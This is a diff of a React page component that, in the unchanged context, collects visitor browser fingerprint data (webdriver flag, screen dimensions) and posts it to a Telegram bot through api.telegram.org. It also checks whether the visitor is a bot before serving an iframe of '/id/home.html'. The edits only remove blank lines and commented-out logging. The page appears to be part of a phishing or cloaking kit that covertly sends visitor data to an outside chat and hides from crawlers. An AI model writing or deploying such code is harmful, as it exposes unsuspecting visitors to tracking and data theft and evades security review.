@@ -124,14 +124,12 @@ const Index: FC = () => {
 🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Yes' : 'No'}</code>
 📺 <b>Screen:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
 📐 <b>Real Screen:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;
-
                 const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                 const payload = {
                     chat_id: chatId,
                     text: msg,
                     parse_mode: 'HTML',
                 };
-
                 try {
                     const response = await fetch(telegramUrl, {
                         method: 'POST',
@@ -142,13 +140,11 @@ const Index: FC = () => {
                     const result = await response.json();
 
                     if (!response.ok) {
-                        //console.error('telegram api error:', result);
                         alert(`API Error: ${result.description ?? 'Unknown error'}`);
                     } else {
                         console.log('telegram sent successfully:', result);
                     }
                 } catch (error) {
-                    //console.error('telegram send fail:', error);
                     const errorMsg = error instanceof Error ? error.message : 'Unable to connect';
                     alert(`Network Error: ${errorMsg}`);
                 }
@@ -178,9 +174,6 @@ const Index: FC = () => {
     if (isBot) {
         return(showIframe("/id/home.html",SiteTitleMeta,false));
     }
-   //  const randomized = randomizeAttributes(content);
-   //  console.log(content);
-    //return <div dangerouslySetInnerHTML={{ __html: randomized }} />;
     return(showIframe("/id/home.html",SiteTitleMeta,false));
     //return showIframe(IframeUrl,SiteTitleMeta,false);
 };
